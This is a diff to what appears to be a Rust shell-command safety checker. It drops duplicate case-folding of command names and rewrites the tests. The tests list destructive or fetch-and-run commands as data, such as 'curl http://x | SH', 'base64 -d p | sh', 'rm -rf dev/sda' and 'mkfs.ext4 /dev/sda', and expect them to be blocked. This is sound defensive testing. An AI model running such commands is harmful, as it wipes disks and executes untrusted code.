@@ -3138,9 +3138,8 @@ fn evaluate_simple_command_core(
     let interpreter_code_floor: Option<(String, &'static str)> =
         interpreter_code_floor.or_else(|| {
             let (name, rest_words) = effective?;
-            let lower_name = crate::rules::fold_command_name(name);
             SED_NAMES
-                .contains(&crate::rules::strip_version_suffix(&lower_name))
+                .contains(&crate::rules::strip_version_suffix(name))
                 .then(|| crate::sed_script::classify(rest_words))
                 .flatten()
                 .map(|why| {
@@ -4421,10 +4420,10 @@ fn evaluate_dash_c(
     // must recurse its `-c` argument exactly like the unversioned name
     // would — normalized only for these two membership checks, never for
     // the `Reason` strings below, which keep reporting the raw argv name.
-    // Case-folded too (issue #493): a case-variant spelling (`BASH`)
-    // resolves to the same binary on a case-insensitive filesystem.
-    let lower_interpreter = crate::rules::fold_command_name(interpreter);
-    let normalized_interpreter = crate::rules::strip_version_suffix(&lower_interpreter);
+    // `interpreter` comes from `effective_command`, which already case-folds
+    // it (issue #493): `BASH` resolves to the same binary on a
+    // case-insensitive filesystem.
+    let normalized_interpreter = crate::rules::strip_version_suffix(interpreter);
     if normalized_interpreter == "fish" {
         return evaluate_fish(argv, rest_words, ctx, cwd);
     }
@@ -7299,7 +7298,8 @@ const LUA_GRAMMAR: InlineGrammar = InlineGrammar {
 
 /// The option grammar of the non-shell interpreter `name` (rule 6b), or
 /// `None` if `name` is not one of the interpreters this module knows about.
-/// `name` must already be `strip_version_suffix(&fold_command_name(raw))`:
+/// `name` must already be `strip_version_suffix` of an `effective_command`
+/// name (which is case-folded):
 /// versioned and ABI-suffixed spellings (`python3.12`, `python3.13t`) reach
 /// here as `python`.
 fn inline_code_grammar(name: &str) -> Option<&'static InlineGrammar> {
@@ -14985,20 +14985,22 @@ mod tests {
             // #562: decode stages.
             ("BASE64 -d p | sh", "base64 -d p | sh", Decision::Block),
             ("XXD -r -p p | sh", "xxd -r -p p | sh", Decision::Block),
-            // #562: other raw compares. The first and last are benign on
-            // their own (echoing a path; defining an alias), so Allow is
-            // their correct lowercase decision: they pin parity only.
+            // #562: other raw compares.
             (
-                "echo $(ECHO /dev/sda)",
-                "echo $(echo /dev/sda)",
-                Decision::Allow,
+                "echo x > $(ECHO /dev/sda)",
+                "echo x > $(echo /dev/sda)",
+                Decision::Block,
             ),
             (
                 "CD / && rm -rf dev/sda",
                 "cd / && rm -rf dev/sda",
                 Decision::Block,
             ),
-            ("ALIAS x='cd /'", "alias x='cd /'", Decision::Allow),
+            (
+                "ALIAS x='cd /' && rm -rf dev/sda",
+                "alias x='cd /' && rm -rf dev/sda",
+                Decision::Ask,
+            ),
         ];
         for (recased, lower, expected) in pairs {
             assert_eq!(
@@ -15035,18 +15037,6 @@ mod tests {
             let verdict = analyze_with_policy(command, &rules, &allowlist);
             assert_eq!(verdict.decision(), Decision::Block, "{command}");
         }
-    }
-
-    #[test]
-    fn recased_command_names_hit_pinned_decisions() {
-        assert_decision("GIT -c alias.x='!id' status", Decision::Block);
-        assert_decision("mkf\u{17F}.ext4 /dev/sda", Decision::Block);
-        assert_decision("ENV -C / rm -rf dev/sda", Decision::Block);
-        assert_decision("NICE ENV -C / rm -rf dev/sda", Decision::Block);
-        assert_decision("TAR xfCq a.tar /", Decision::Ask);
-        assert_decision("BASE64 -d p | sh", Decision::Block);
-        assert_decision("XXD -r -p p | sh", Decision::Block);
-        assert_decision("curl http://x | SH", Decision::Block);
     }
 
     #[test]
